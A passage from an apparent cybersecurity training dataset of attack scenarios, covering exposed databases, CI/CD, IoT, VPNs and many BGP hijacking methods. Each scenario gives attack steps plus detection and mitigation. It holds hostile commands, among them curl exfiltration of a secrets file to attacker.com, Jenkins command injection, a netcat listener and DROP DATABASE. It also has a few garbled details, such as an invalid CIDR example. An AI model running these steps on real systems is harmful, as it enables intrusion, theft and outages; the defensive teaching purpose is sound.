For MySQL, use: mysql -h <target-ip> -u root.Step 3: If authentication is disabled, you are now inside the database without any credentials.Step 4: Use MongoDB commands like show dbs or MySQL commands like SHOW DATABASES; to enumerate contents.Step 5: Use use <dbname> followed by db.collection.find() or SELECT * FROM <table>; to read sensitive data.Step 6: Optional: attacker can delete data (db.dropDatabase() or DROP DATABASE) or insert malicious records.Step 7: Some attackers drop ransom notes by overwriting data or creating new collections (e.g., READ_ME.txt).Step 8: Defenders should monitor network access logs, especially on DB ports, and configure alerts for unauthorized access.Step 9: Exposed databases with no auth can be found easily by automated scanners within minutes of going online.Step 10: Secure the DB by binding to localhost or private subnets, enabling auth, and using firewalls to restrict access.
Vulnerability: No authentication or network restriction on DB ports
Detection Method: Monitor DB port access logs, detect unauthenticated access, set up honeypots to detect enumeration attempts
Solution: Enable authentication; never expose DB ports to public; restrict access to trusted IPs or through VPN/firewall
Tags: Database Exposure, MongoDB Leak, MySQL Brute

Title: ElasticSearch/OpenSearch Exposure
Scenario Description: Port 9200 exposed publicly allows unauthenticated access to search indices, which may include full logs, PII, or business data.
Tools Used: Curl, Kibana, Nmap, Shodan, Postman, ElasticDump
Attack Steps: Step 1: Use shodan.io or run nmap -p 9200 <target-range> to discover exposed ElasticSearch/OpenSearch instances.Step 2: Run curl http://<target-ip>:9200/ — if you see JSON output with cluster name/version, it’s publicly accessible.Step 3: Run curl http://<target-ip>:9200/_cat/indices?v to list available indices.Step 4: To dump sensitive content, use: curl http://<target-ip>:9200/<index>/_search?q=*:* or tools like elasticdump.Step 5: If the server allows write access, attacker may inject logs, delete data, or index malicious payloads via POST/PUT.Step 6: Exposed logs may contain user credentials, internal paths, API keys, or chat messages depending on use-case.Step 7: Defender can detect this via HTTP logs, spikes in _search or _cat calls, or monitoring for public access from unknown IPs.Step 8: Logs or monitoring platforms (e.g., ELK) often misconfigure these by exposing them without auth.Step 9: Tools like Wappalyzer or http-title can also identify Elastic endpoints during scanning.Step 10: Use firewall rules, enable security plugin/X-Pack, and restrict index access only to required systems and users.
Detection Method: Monitor access logs, detect _cat and _search abuse, use IDS with Elastic detection rules
Solution: Enable authentication, firewall 9200, disable public access, use RBAC and audit logging
Tags: ElasticSearch Leak, Logging Exposure, OpenSearch Abuse

Title: Exposed Internal APIs
Scenario Description: APIs intended for internal access (e.g., /debug, /admin/api) are left exposed to the internet, allowing logic abuse or unauthorized access.
Tools Used: Postman, Burp Suite, FFUF, cURL, Shodan
Attack Steps: Step 1: Attacker uses tools like ffuf, dirsearch, or Shodan to discover unusual endpoints (e.g., /api/internal, /debug, /v1/internal/users).Step 2: Sends unauthenticated requests using curl or Postman to check if sensitive operations (like user enumeration or data access) are allowed.Step 3: If APIs return full user data, internal logic, or admin actions without any authentication — the attacker now has backend access.Step 4: Tries known GET, POST, PUT, DELETE actions to test for full CRUD capability (e.g., DELETE /api/internal/user/1).Step 5: If GraphQL or REST APIs expose schema, the attacker maps the entire internal logic.Step 6: APIs may also leak internal IPs, debug logs, credentials in verbose error messages.Step 7: Defender can use logging, API gateways, or WAF to block such abuse.Step 8: Automated scanners often pick up such APIs within 24h of public exposure.Step 9: Developers often forget to disable internal endpoints in production.Step 10: Apply zero-trust: internal APIs should require auth + token validation, and be isolated from the public interface.
Impact: API logic exposure, full internal data access
Detection Method: Analyze access logs for unauthenticated API calls, use endpoint discovery tools to review public exposure
Solution: Disable public access to internal APIs; require strong auth and RBAC; use API Gateway for traffic filtering

Title: Firewall Allows All Outbound Traffic
Scenario Description: A firewall policy that allows all outbound traffic enables malware to freely exfiltrate data or communicate with external C2 servers undetected.
Tools Used: Wireshark, Python, Netcat, DNS tools, cURL, Tor
Attack Steps: Step 1: Attacker gains access to an internal host (via phishing, malware, USB drop, or prior access).Step 2: Attacker tests outbound connectivity by running ping 8.8.8.8, curl https://example.com, and dig google.com.Step 3: Confirms there are no egress restrictions — all traffic types (HTTP, HTTPS, DNS, FTP, ICMP) are allowed to exit the network.Step 4: Attacker now sets up a C2 server externally (e.g., a VPS running nc -lvnp 443 or python3 -m http.server).Step 5: The infected host connects to the C2 using a simple curl -X POST https://attacker.com/c2 or sends DNS beacons like curl http://data-leak.attacker.com.Step 6: The attacker can now exfiltrate any data by encoding it into outbound HTTPS/DNS requests (e.g., curl -F 'file=@secrets.txt' https://attacker.com).Step 7: Firewall logs show no alerts because outbound traffic is allowed and looks legitimate.Step 8: Attacker may use DNS tunneling tools (like dnscat2, iodine) or proxy traffic via Tor or HTTPS.Step 9: Defender must inspect outbound traffic patterns, especially toward unknown IPs/domains or excessive DNS queries.Step 10: Block all outbound traffic by default and allow only trusted ports (e.g., 443) with domain whitelisting to stop this.
Impact: Complete C2 control, silent data theft
Detection Method: Analyze outbound DNS, HTTP/S traffic; detect unknown destinations; use firewall alerts for port anomalies
Solution: Apply default-deny outbound policy; enable proxy with SSL inspection; use DLP to detect outbound sensitive data
Tags: Firewall Misconfig, Egress Abuse, Outbound C2

Title: Exposed CI/CD Services
Scenario Description: Jenkins, GitLab Runners, or similar CI/CD systems are exposed to the internet, allowing remote code execution or credential theft via open APIs/UI.
Tools Used: Nmap, Shodan, Jenkins CLI, GitLab CLI, Burp Suite
Attack Steps: Step 1: Attacker scans for CI/CD servers using Shodan (title:"Jenkins" port:8080) or nmap -p 8080,443 <target-range>.Step 2: Accesses Jenkins via browser at http://<target-ip>:8080. If not protected by a login or if default creds work (admin:admin), attacker gets UI access.Step 3: Uses the Jenkins script console (/script) or pipeline editor to inject Groovy code: println "Hacked" or OS commands (sh 'curl attacker.com').Step 4: For GitLab runners, attacker checks for exposed APIs, or misconfigured .gitlab-ci.yml files allowing pipeline injection.Step 5: With access, attacker may extract credentials, SSH keys, tokens, or trigger builds that deploy backdoors or upload data to attacker-controlled destinations.Step 6: Supply chain risk increases if pipelines build software for end-users — attacker may insert malware directly into builds.Step 7: Defender should audit build logs, access attempts, and script history.Step 8: CI/CD tools often log everything — attackers try to clear logs, but many services sync to external systems.Step 9: Never expose Jenkins/GitLab to internet without strong auth + IP whitelisting.Step 10: Enforce RBAC, disable script consoles, and regularly rotate API tokens and secrets.
Detection Method: Monitor build history, detect abnormal config changes, watch for unauthorized API access
Solution: Require login + 2FA, bind CI/CD to localhost or VPN, rotate credentials, isolate runners from prod envs
Tags: CI/CD Abuse, DevOps Exploit, Jenkins RCE

Title: Unrestricted SNMP Access
Scenario Description: SNMP (port 161) is exposed to the internet with default community strings like public, allowing attackers to dump system and routing information.
Attack Steps: Step 1: Attacker scans for SNMP exposure using: nmap -p 161 -sU --script=snmp-info <target-ip>.Step 2: Uses snmpwalk -v 2c -c public <target-ip> to query system info like hostname, OS version, running processes, and more.Step 3: Tries additional tools like onesixtyone for brute-force of SNMP community strings (e.g., private, public123).Step 4: Dumps routing tables, interface configurations, CPU usage, and user activity logs using OIDs.Step 5: Information helps attacker map the internal network for lateral movement or future exploitation.Step 6: If rw (read-write) community is exposed, attacker can reconfigure network settings remotely.Step 7: Defender may not notice the attack unless SNMP logs are collected and alerts are configured for external queries.Step 8: Organizations often forget SNMP is enabled by default on routers, printers, and IoT devices.Step 9: Disable SNMP on any device exposed to the internet and use SNMPv3 with auth/encryption internally only.Step 10: Monitor for UDP 161 traffic from untrusted IPs.
Detection Method: Watch for SNMP requests in firewalls or flow logs, alert on community string brute-force
Solution: Disable SNMP if not needed; restrict SNMP to internal IPs; use SNMPv3 only with strong credentials

Title: Open Ports to IoT Devices
Scenario Description: IP cameras, smart sensors, or home appliances exposed on public IPs allow takeover via default credentials or outdated firmware vulnerabilities.
Tools Used: Shodan, Nmap, Default Creds DB, Hydra, Telnet, CCTV tools
Attack Steps: Step 1: Use Shodan with queries like port:554 has_screenshot:true or port:23 title:"IP Camera" to find exposed IoT devices (e.g., webcams, DVRs).Step 2: Identify vendor/model from banners, then search default credentials (e.g., admin:admin for Hikvision, root:12345 for DVRs).Step 3: Use hydra or telnet to try logging in — many IoT interfaces don’t throttle login attempts.Step 4: On success, attacker can access live camera feeds, change settings, reboot device, or drop payloads (e.g., join botnet like Mirai).Step 5: May also abuse open RTSP ports (e.g., rtsp://<ip>/live) to stream video/audio without login.Step 6: Some devices allow firmware updates via web panel — attacker may upload custom firmware.Step 7: Defender may not detect this unless logging outbound video streams or receiving alerts on device changes.Step 8: IoT firmware often has hardcoded backdoors and weak crypto.Step 9: Secure all IoT via NAT, firewall rules, and strong creds.Step 10: Regularly scan for exposed ports from your own network (nmap -sS <your-ip-range>) to detect leaks.
Vulnerability: Default creds, open ports, no patching
Impact: Device control, botnet infection, data leakage
Detection Method: Monitor for traffic to IoT ports, unexpected device activity, or outbound video streams
Solution: Change default creds, block external access, regularly update firmware, use network segmentation
Tags: IoT Hacking, Default Passwords, Mirai Botnet

Title: Unrestricted VPN Ports (1194/500/4500)
Scenario Description: VPN ports (e.g., UDP 1194 for OpenVPN, UDP 500/4500 for IPsec) are open to the internet, allowing attackers to exploit misconfigurations or use them as covert channels.
Tools Used: Nmap, ike-scan, OpenVPN, strongSwan, Wireshark, Shodan
Attack Steps: Step 1: Attacker uses shodan.io or nmap -sU -p 1194,500,4500 <target-range> to identify systems with publicly accessible VPN ports.Step 2: Identifies the VPN type based on response fingerprints (e.g., OpenVPN responds with a TLS/SSL handshake on port 1194; IPsec with IKE negotiation on 500/4500).Step 3: For IPsec/IKEv2 targets, runs ike-scan <target-ip> to probe for supported authentication methods and gather VPN configuration data.Step 4: Tries to brute-force or test default VPN credentials via strongSwan, openconnect, or openvpn --config <.ovpn> if the config is leaked.Step 5: If VPN is misconfigured to allow split tunneling without proper ACLs, attacker can route malicious traffic through the VPN tunnel.Step 6: With access, attacker can pivot into internal network subnets (e.g., 10.x.x.x or 192.168.x.x) which are normally unreachable from outside.Step 7: Can also exfiltrate data by tunneling outbound HTTP/S or DNS traffic inside the VPN tunnel, bypassing perimeter firewalls or proxy filters.Step 8: Defender may not detect this as traffic is encrypted and appears as normal VPN use, unless logging VPN IP-to-user mapping and internal flow behavior.Step 9: Organizations often expose VPN endpoints to the internet with weak passwords or without MFA, making them a prime target for brute-force or phishing-based credential theft.Step 10: Secure VPN access by enforcing MFA, restricting IP ranges, auditing logs, and ensuring internal segmentation after VPN login.
Vulnerability: VPN ports publicly reachable with weak auth or config
Impact: Internal network access, covert channel creation
Detection Method: Correlate VPN logs with user IPs, detect unusual internal access from VPN pool, monitor port 1194/500/4500 exposure
Solution: Restrict VPN access by IP, enforce strong auth and MFA, disable unused protocols, log and audit VPN sessions
Tags: VPN Abuse, IPsec Exploit, OpenVPN, Covert Channels

Title: Prefix Hijacking
Scenario Description: An attacker Autonomous System (AS) advertises ownership of IP prefixes that actually belong to another AS, causing global routing tables to redirect traffic.
Tools Used: BGP toolkit (BIRD, ExaBGP), Wireshark, RIPEstat, bgpstream
Attack Steps: Step 1: Attacker owns or compromises a BGP-speaking router in an Autonomous System (AS) connected to the internet via an ISP.Step 2: The attacker configures the router to announce a BGP route for a prefix they do not own (e.g., 203.0.113.0/24, which belongs to a different AS).Step 3: ISPs and upstream routers, unless filtering, accept this announcement because BGP lacks built-in validation.Step 4: The global BGP routing table updates and directs traffic for that prefix to the attacker’s AS instead of the legitimate one.Step 5: All traffic to the hijacked IP range is now routed to the attacker — who can drop it, intercept it, or forward it elsewhere.Step 6: This can disrupt services (e.g., Gmail, AWS, DNS) depending on the prefix hijacked.Step 7: Monitoring platforms like bgpstream.com or RIPEstat may show the change in route origin.Step 8: Defenders must rely on RPKI/ROA to detect and block invalid route announcements.Step 9: Hijacks are often short-lived (a few minutes/hours) to avoid detection.Step 10: Such attacks have been used for cryptocurrency theft, censorship bypass, and surveillance.
Vulnerability: BGP lacks origin validation by default
Detection Method: Monitor BGP route changes, use RPKI/ROA, inspect route origin AS mismatches
Solution: ISPs must enforce BGP filtering and route validation (RPKI, max prefix limits, strict import policies)
Tags: BGP Hijacking, Internet Routing, Border Gateway Protocol

Title: Sub-Prefix Hijacking (More Specific Prefix)
Scenario Description: Attacker announces a more specific prefix (e.g., /24) inside a legitimate larger block (e.g., /16) to override the route due to BGP path selection rules.
Attack Steps: Step 1: Attacker selects a target prefix like 192.0.2.0/16 that is used by a legitimate organization.Step 2: Attacker's compromised or rogue AS begins announcing a more specific route inside that range (e.g., 192.0.2.128/24).Step 3: Due to BGP longest-prefix match rule, most routers prefer /24 over /16, so traffic to this subrange is redirected to the attacker.Step 4: Attacker uses tools like ExaBGP to make the announcement and simulate proper BGP behavior.Step 5: This allows redirection of only a slice of the full traffic, making it harder to detect while enabling targeted interception or disruption.Step 6: Defenders monitoring only /16 routes may miss this hijack unless subnet route inspection is enabled.Step 7: This method was used in real-world attacks (e.g., MyEtherWallet BGP attack in 2018).Step 8: Attacker may send malicious content or spoofed responses by impersonating web services or DNS for the sub-prefix.Step 9: Detection requires granular prefix monitoring and route origin validation tools like RPKI/IRR.Step 10: Mitigation involves prefix filtering and rejecting unexpected sub-prefixes at ISP peering points.
Vulnerability: Lack of sub-prefix filtering at ISPs
Detection Method: Monitor for unauthorized /24 announcements inside /16 blocks, use BGP anomaly detection tools like BGPMon
Solution: Enforce strict prefix filtering, RPKI validation, drop unexpected subnets from external peers
Tags: BGP Hijack, Routing Abuse, Subnet Redirection

Title: Man-in-the-Middle via Route Interception
Scenario Description: Combines hijack with forwarding to make the attack stealthy — attacker captures traffic, inspects or alters it, then forwards to legitimate destination.
Tools Used: BIRD, Wireshark, ExaBGP, tcpdump, route manipulation tools
Attack Steps: Step 1: Attacker performs a prefix or sub-prefix hijack using ExaBGP or BIRD to announce the target network range.Step 2: Instead of dropping traffic, attacker routes packets through their own infrastructure first, captures/inspects them, then forwards to the actual destination.Step 3: This creates a transparent man-in-the-middle situation where legitimate services continue functioning, but attacker has full access to unencrypted traffic.Step 4: For HTTPS or SSH, attacker may collect SNI, IP metadata, timing info, or attempt TLS downgrade (if poorly configured clients are involved).Step 5: Attacker may perform traffic shaping, inject ads, or modify DNS responses.Step 6: Tools like tcpdump or Wireshark on the interception router allow traffic recording.Step 7: This is very hard to detect unless latency changes, certificate pinning breaks, or routing anomalies are continuously monitored.Step 8: Forwarding rules can be set with ip route or iptables NAT rules to complete the packet loop.Step 9: Such attacks have been used for espionage, crypto theft, and surveillance.Step 10: Detection involves correlation of BGP route changes and abnormal connection paths using tools like Traceroute, RIPE Atlas.
Detection Method: Use route path validation, anomaly detection, and deep packet inspection for altered flows
Solution: RPKI-based filtering, alert on upstream AS path changes, enforce TLS pinning in critical apps

Title: Traffic Blackholing
Scenario Description: Attacker announces route(s) for critical IP ranges and drops the packets, effectively making services disappear without directly attacking the servers.
Tools Used: ExaBGP, BIRD, IP Blackhole Services, bgpstream
Attack Steps: Step 1: Attacker announces a valid-looking BGP route for a victim’s IP range using an upstream provider or misconfigured peer.Step 2: Instead of routing the packets to any service, the attacker configures the route to go to a non-existent or null interface (null0, /dev/null).Step 3: This causes all incoming traffic to be silently discarded — no ACKs, errors, or responses are sent.Step 4: The target services (e.g., website, email, DNS, CDN) appear to be offline or unreachable for users worldwide or in certain regions.Step 5: Such attacks may be political (censorship), financially motivated (ransom), or part of larger DDoS campaigns.Step 6: These are harder to notice than a direct DoS because infrastructure itself appears healthy, but users can't connect.Step 7: Some ISPs also offer “BGP blackholing” as a DDoS mitigation technique — attacker can abuse similar mechanisms.Step 8: Defender can verify through BGP route analysis, ping tests, and route tracing tools.Step 9: Monitoring via routeviews, bgpstream, or regional traceroutes (RIPE Atlas) can help detect sudden traffic loss.Step 10: Prevent by filtering illegitimate BGP updates, securing BGP sessions with MD5 auth, and validating route origin via RPKI.
Vulnerability: No validation of BGP routes + no return path enforcement
Impact: Global denial of access, forced outage
Detection Method: Monitor for BGP hijacks and route nulls using routeviews, RIPE RIS, BGP alerts
Solution: Validate BGP updates, use prefix filters, enable route origin authentication and peer whitelisting
Tags: BGP Blackholing, Route Nulling, Internet Takedown

Title: Prefix Squatting
Scenario Description: Attacker announces IP prefixes that are unallocated (not yet officially assigned by RIRs) and uses them for malicious activity while avoiding attribution.
Tools Used: ExaBGP, BIRD, RIPE RIS, bgp.tools, Wireshark
Attack Steps: Step 1: Attacker researches IP blocks that are currently unallocated using data from IANA or RIRs (e.g., ARIN, RIPE, APNIC).Step 2: Selects a prefix such as 198.18.0.0/15 (which may be reserved or temporarily unused).Step 3: Attacker sets up a BGP router (e.g., using ExaBGP or BIRD) on a rented VPS or compromised AS.Step 4: Announces the fake prefix to their upstream ISP, which may accept it if they lack strict prefix filters.Step 5: BGP updates propagate globally, and the squatted prefix becomes reachable to the public.Step 6: Attacker uses this prefix to host phishing sites, malware C2 servers, or spam email infrastructure.Step 7: Attribution is difficult because WHOIS, IP allocation records show no owner or unrelated dummy info.Step 8: Traffic flows until the hijack is reported or upstream filtering is corrected.Step 9: Defenders can use bgpstream, RIPEstat, and bgp.tools to spot invalid announcements or unallocated blocks in routing tables.Step 10: ISPs must reject prefixes not found in authoritative registries using prefix filtering and ROA validation.
Vulnerability: Lack of prefix validation, use of unallocated blocks
Impact: Spam, malware hosting, C2 with anonymity
Detection Method: BGP anomaly tools (bgpstream, RIPE RIS), watch for invalid/unassigned IP originators
Solution: ISPs must drop unallocated prefixes; use strict filters; validate using RPKI and IRR databases
Tags: IP Squatting, BGP Abuse, Phantom IPs

Title: BGP Route Flap Attack
Scenario Description: Attacker repeatedly advertises and withdraws routes, overloading routers and causing instability or packet loss in large parts of the internet.
Attack Steps: Step 1: Attacker sets up a BGP-speaking host with peering to an ISP or misconfigured testbed with BGP emulation (e.g., using GNS3 or ExaBGP).Step 2: Selects a prefix under their control or fakes one (e.g., 203.0.113.0/24).Step 3: Programs BGP router to advertise the prefix, then withdraw it rapidly in a loop (e.g., every few seconds).Step 4: This causes upstream and peer routers to repeatedly update their BGP tables.Step 5: Resulting churn can overload routers, especially in core networks, causing routing delays, CPU spikes, or route dampening.Step 6: In extreme cases, this can disrupt DNS resolution, CDN routing, or large-scale cloud access.Step 7: Attack is silent and not easily spotted unless route flapping thresholds are monitored.Step 8: Some routers may auto-suppress (dampen) flapping prefixes after a threshold (default: 1000 penalty), but many don't.Step 9: Defenders should monitor for excessive updates per prefix using tools like bgpalerter or bgpstream.Step 10: Implement BGP dampening policies and limit per-prefix update rates.
Vulnerability: No rate limiting on BGP updates from peers
Impact: BGP churn, packet drops, degraded performance
Detection Method: Monitor update/withdraw cycles; enable route flap detection and auto-suppression
Solution: Enable BGP route flap dampening; log route churn rates; limit trust in downstream BGP sessions

Title: BGP Leak Attack
Scenario Description: Misconfigured AS leaks internal (non-public) BGP routes to external peers, disrupting routing and enabling traffic hijack unintentionally.
Tools Used: GNS3, ExaBGP, bgp.tools, Wireshark, route inspection tools
Attack Steps: Step 1: AS (could be attacker or negligent admin) receives BGP updates from its upstream providers and internal peers.Step 2: Due to misconfiguration, internal routes (e.g., customer prefixes, non-transit routes, default routes) are re-advertised to external providers.Step 3: External peers propagate those routes further — causing global routing tables to incorrectly redirect traffic via the leaking AS.Step 4: Inadvertent hijacks can cause outages — e.g., traffic to AWS/GCP being misrouted through a regional ISP.Step 5: Real-world example: Pakistan Telecom accidentally hijacked YouTube’s prefixes in 2008, taking it offline globally.Step 6: BGP leaks can happen due to wrong import/export route-maps, missing NO_EXPORT flags, or faulty AS_PATH prepending.Step 7: Monitoring shows origin AS mismatch and unexpected upstream paths.Step 8: Defenders must compare advertised prefixes against RPKI ROAs and use tools like bgpstream to alert on abnormal propagation.Step 9: Also possible for attackers to intentionally trigger such leaks to create diversions.Step 10: Use BGP route filtering and peer-specific route-maps to block leaks.
Vulnerability: Poor route filtering and export policy control
Detection Method: Use prefix filters; monitor for AS_PATH inconsistencies; rely on peer route control policies
Solution: Implement export route-maps; filter customer-learned routes; enable strict BGP peering rules

Title: Forged BGP UPDATE Injection
Scenario Description: Attacker forges BGP UPDATE packets to manipulate routing tables of peer routers by injecting malicious or invalid routing information.
Tools Used: Scapy, ExaBGP, GNS3, TCPdump, BGP packet crafting tools
Attack Steps: Step 1: Attacker gains access to a compromised router or a directly connected peer to a BGP speaker.Step 2: Uses tools like Scapy or ExaBGP to craft and inject fake BGP UPDATE messages.Step 3: These UPDATEs may announce forged prefixes, fake origin AS numbers, or even withdraw legitimate routes.Step 4: This causes receiving routers to update their routing tables based on invalid or malicious data.Step 5: Potential impacts include hijack, denial of service, or redirection of data via attacker-controlled infrastructure.Step 6: Attackers may spoof BGP session establishment using TCP/IP hijacking or reuse leaked session tokens.Step 7: Unlike normal BGP hijack, this method does not require full peering – only access to the wire or router.Step 8: Detection involves inspecting raw BGP messages and session states using Wireshark or router logs.Step 9: Defenders can enable BGP session protection (e.g., TCP MD5 authentication or TTL security mechanism).Step 10: ISPs must reject UPDATEs from unexpected peers and validate all session integrity.
Vulnerability: No cryptographic validation of BGP sessions
Impact: Traffic hijack, routing disruption, AS path spoofing
Detection Method: Monitor router session logs, enable BGP TTL hacks, inspect UPDATE message origins
Solution: Enforce BGP MD5 auth, TTL hop limits, anomaly detection tools (BGPmon, bgpalerter)
Tags: BGP UPDATE Injection, Route Spoofing, BGP Abuse

Title: Fake Origin ASN
Scenario Description: Attacker announces IP prefixes pretending to originate from a legitimate AS number, misleading routing decisions and abusing AS-level trust.
Tools Used: ExaBGP, BIRD, bgpstream, Scapy, RIPE RIS
Attack Steps: Step 1: Attacker prepares a BGP-capable router using ExaBGP or BIRD.Step 2: Identifies a trusted ASN (e.g., Google's AS15169) and a prefix usually announced by it (e.g., 8.8.8.0/24).Step 3: Attacker announces the prefix with a fake AS_PATH, putting AS15169 at the origin (last position).Step 4: Due to lack of AS origin validation in most networks, some peers may accept the fake route.Step 5: This allows attacker to impersonate trusted services or redirect traffic through themselves.Step 6: Attackers may serve fake DNS results, MITM traffic, or intercept unencrypted protocols.Step 7: Monitoring tools like bgp.tools or RIPEstat will show origin mismatch but require active checking.Step 8: Without RPKI validation, routers have no way of rejecting origin spoof.Step 9: This has been seen in cryptocurrency scams, surveillance, and spoofed CDN delivery.Step 10: Defenders must enable RPKI and AS_PATH verification at ISP routers.
Detection Method: Monitor BGP origin data vs WHOIS, enable RPKI route origin validation
Solution: Use RPKI (ROA) filtering, reject routes with unexpected AS_PATH, monitor BGP updates via trusted sensors
Tags: Fake ASN, Origin Spoofing, BGP Abuse

Title: Targeted Country/Region Hijack
Scenario Description: Attacker hijacks BGP prefixes used by ISPs in a specific country, to censor, monitor, or manipulate traffic only within that region.
Attack Steps: Step 1: Attacker identifies prefixes belonging to a target country (e.g., using https://bgpview.io or WHOIS + geo-IP databases).Step 2: Chooses sensitive ISPs or cloud providers used widely in that country (e.g., ISPs in Ukraine, Iran, India).Step 3: From a malicious or compromised AS, the attacker announces those prefixes or sub-prefixes with valid-looking AS_PATH.Step 4: Since routing decisions are regional, only users in the targeted region are affected (e.g., local ISPs prefer shorter AS paths).Step 5: Attacker now sees or manipulates DNS, HTTP, and TLS traffic from users in that region.Step 6: Attack can be stealthy by forwarding packets to the real destinations with slight delay, allowing surveillance.Step 7: Some past examples involved state-sponsored hijacks to censor or inject propaganda.Step 8: Detection often requires cross-country comparison of routing tables (e.g., via RIPE Atlas probes or bgpstream).Step 9: Most users remain unaware as sites still resolve and load, but may serve censored/altered content.Step 10: Mitigation includes geolocation-aware route validation and secure DNS/TLS pinning.
Vulnerability: Trust-based route acceptance, no region validation
Detection Method: Compare BGP views from outside vs inside country; track prefix movements across ASNs
Solution: Push ISPs to validate peers via RPKI, educate users on HTTPS pinning, use DoH/DoT, and VPN services

Title: Hijacking CDN IP Space
Scenario Description: Attacker hijacks IP blocks used by CDNs like Akamai or Cloudflare, serves malicious content to clients trusting edge nodes.
Tools Used: bgpstream, Wireshark, ExaBGP, CDN IP lists
Attack Steps: Step 1: Attacker looks up the IP ranges used by major CDNs like Akamai, Cloudflare, Fastly, etc. (e.g., via WHOIS or https://bgpview.io).Step 2: Identifies commonly used /24 edge node prefixes globally (e.g., 104.16.0.0/24).Step 3: Announces that prefix from their AS via BGP, spoofing the origin.Step 4: ISPs without strict RPKI validation may accept the route and send client traffic to the attacker.Step 5: Attacker mimics the CDN response behavior — e.g., valid TLS certs (Let’s Encrypt), caching headers, or web content.Step 6: Serves fake JavaScript updates, malware payloads, or phishing login pages while appearing trusted.Step 7: If the attacker forwards connections to the actual CDN via proxy, users won’t detect changes easily.Step 8: This can poison corporate caches or web security filters relying on CDN IPs.Step 9: Detection may require CDN-side alerting or comparing TLS cert chains.Step 10: CDN providers must aggressively monitor IP ownership, RPKI, and alert downstream customers to hijacks.
Vulnerability: Unprotected CDN IP ranges in global BGP table
Impact: Supply chain poisoning, malware via trusted CDN
Detection Method: Monitor IP-to-ASN mismatches, TLS fingerprint mismatches, global traceroutes
Solution: Use RPKI for CDN-owned prefixes, encrypt content end-to-end, enable HSTS, use TLS pinning
Tags: CDN Hijack, Web Poisoning, JavaScript Injection

Title: TLS Downgrade via Rerouting
Attack Type: Traffic Rerouting to Enforce Weak TLS
Scenario Description: Attacker hijacks or intercepts traffic to force fallback to vulnerable or outdated TLS versions, enabling decryption or downgrade attacks.
Attack Steps: Step 1: Attacker hijacks or intercepts BGP traffic targeting a specific service (e.g., Gmail, Office365, internal corporate services).Step 2: Redirects TLS traffic to an intermediate MITM proxy (e.g., sslsplit or mitmproxy).Step 3: Configures the MITM proxy to simulate a server with TLS 1.0 or 1.1, or use weak ciphers (e.g., RSA 1024, RC4).Step 4: If the client is misconfigured or doesn’t enforce TLS version/cipher restrictions, it will downgrade the session.Step 5: Attacker then decrypts traffic or injects malicious JavaScript, session tokens, or redirects.Step 6: Alternatively, attacker simply logs all downgraded session content for later analysis.Step 7: Downgrade-resistant clients (with TLS 1.2+ strict enforcement) may fail to connect, which may go unnoticed by users.Step 8: Attack detection is difficult unless security teams inspect TLS handshake metadata and validate TLS fingerprint anomalies.Step 9: Some organizations use HSTS, certificate pinning, and TLS version enforcement — bypassing these requires full browser exploitation.Step 10: Defenders must block insecure ciphers, monitor route changes, and enforce strict TLS configurations at both client and server sides.
Vulnerability: Clients accepting weak TLS fallback during routing
Impact: SSL interception, session hijack, credential theft
Detection Method: Monitor TLS handshake versions and cipher suites; inspect traffic for MITM proxies or altered cert chains
Solution: Disable TLS 1.0/1.1, enforce strong ciphers, use certificate pinning and HSTS, monitor BGP route changes
Tags: TLS Downgrade, MITM, BGP Traffic Hijack

Title: DNS Hijacking via Prefix Theft
Attack Type: DNS Redirection through BGP Prefix Hijack
Scenario Description: Attacker hijacks the BGP prefix used by authoritative DNS resolvers or open recursive resolvers, silently redirecting DNS queries to malicious servers.
Tools Used: ExaBGP, RIPEstat, GNS3, BGPStream, dig, Wireshark
Attack Steps: Step 1: Attacker researches IP prefixes used by authoritative or open DNS resolvers (e.g., Google DNS: 8.8.8.0/24, Cloudflare DNS: 1.1.1.0/24, or target enterprise resolvers).Step 2: Sets up a rogue BGP router using ExaBGP or BIRD and prepares to announce the same prefix with a shorter AS path or more specific prefix (e.g., 8.8.8.0/25).Step 3: Announces the malicious prefix to upstream ISP or IX peers lacking RPKI validation.Step 4: Traffic destined for DNS queries (UDP/53 or TCP/53) is now redirected to attacker’s DNS server.Step 5: The attacker’s DNS server is configured to log requests and optionally poison responses — e.g., resolve example.com to a malicious IP.Step 6: If recursive queries are hijacked, attacker sees user behavior (e.g., domains accessed) or injects malware links via DNS spoofing.Step 7: Hijacked DNS traffic may allow full domain hijacking (e.g., when NS records are poisoned).Step 8: Detection requires monitoring sudden changes in DNS resolver IPs, AS path shifts, or anomalous DNS query logs.Step 9: To defend, use DNSSEC, pin known NS IPs, validate RPKI for DNS infrastructure.Step 10: Implement DNS-over-TLS (DoT) or DNS-over-HTTPS (DoH) where possible.
Vulnerability: Lack of BGP filtering and DNS infrastructure validation
Impact: Domain hijack, traffic redirection, DNS poisoning
Detection Method: Detect resolver AS origin shifts, monitor passive DNS logs, deploy DNSSEC, use RPKI route validation
Solution: Use DNSSEC, validate NS records via cryptographic proofs, filter prefixes via RPKI, monitor DNS request anomalies
Tags: DNS Hijack, Prefix Theft, Domain Spoofing

Title: Bitcoin or Crypto Transaction Hijacking
Scenario Description: Attacker hijacks BGP prefixes used by mining pools or blockchain nodes to intercept, modify, or redirect cryptocurrency transactions and mining results.
Tools Used: BGPStream, ExaBGP, BTC node software, Wireshark
Attack Steps: Step 1: Attacker identifies IP ranges used by major mining pools (e.g., stratum+tcp://miningpool.com:3333) or full nodes (e.g., Bitcoin Core, Ethereum Geth nodes).Step 2: Attacker configures a rogue BGP speaker using ExaBGP to announce a prefix containing those IPs, ensuring low latency or more specific route.Step 3: Redirects miner traffic or node sync traffic to attacker-controlled endpoints.Step 4: Mining clients continue sending shares to the "pool" — unaware that attacker is collecting them or rewriting payouts.Step 5: Alternatively, attacker rewrites blockchain transactions in transit or delays/block propagation between nodes.Step 6: In some cases, this allows selfish mining or payout theft by modifying coinbase fields.Step 7: The attacker can also use this for surveillance — watching who sends transactions or connects to what wallets.Step 8: Detection is difficult unless miners monitor pool certificate mismatches, latency spikes, or payout anomalies.Step 9: Blockchain communities should log peer connection IP changes, enable TLS, and validate hash chains per block.Step 10: Using Tor or VPN over mining/protocol traffic adds protection from route-level hijack.
Vulnerability: BGP prefix hijack, no traffic authentication
Impact: Cryptocurrency theft, blockchain denial of service
Detection Method: Monitor mining pool IPs, detect payout fraud, log peer route changes
Solution: Use TLS encryption in mining protocols, monitor for BGP hijack, use decentralized pools with multipath connectivity
Tags: Crypto Theft, Blockchain Hijack, BGP Interception

Title: Email Interception via MX Hijack
Attack Type: BGP Hijack Targeting Mail Server IPs
Scenario Description: Attacker hijacks MX record IP prefixes of a target domain to intercept incoming email, enabling email reading or spoofing without endpoint compromise.
